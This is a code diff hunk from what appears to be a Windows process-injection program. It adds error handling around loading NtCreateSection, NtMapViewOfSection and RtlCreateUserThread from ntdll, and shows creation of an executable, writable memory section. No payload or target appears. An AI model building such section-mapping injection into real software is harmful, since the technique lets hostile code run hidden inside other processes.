@@ -38,14 +38,21 @@ INT main() {
 	// Load required functions from ntdll
 	//
 	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
-	pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
-	pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
-	pRtlCreateUserThread = (RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
+	if (hNtdll) {
+		pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
+		pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
+		pRtlCreateUserThread = (RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
+		FreeLibrary(hNtdll);
+	}
+	else {
+		return ERROR_MOD_NOT_FOUND;
+	}
 
 	//
 	// Create a section
 	//
-	ntStatus = pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+	ntStatus = pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, 
+		(PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 	if (!NT_SUCCESS(ntStatus)) {
 		return ntStatus;
 	}
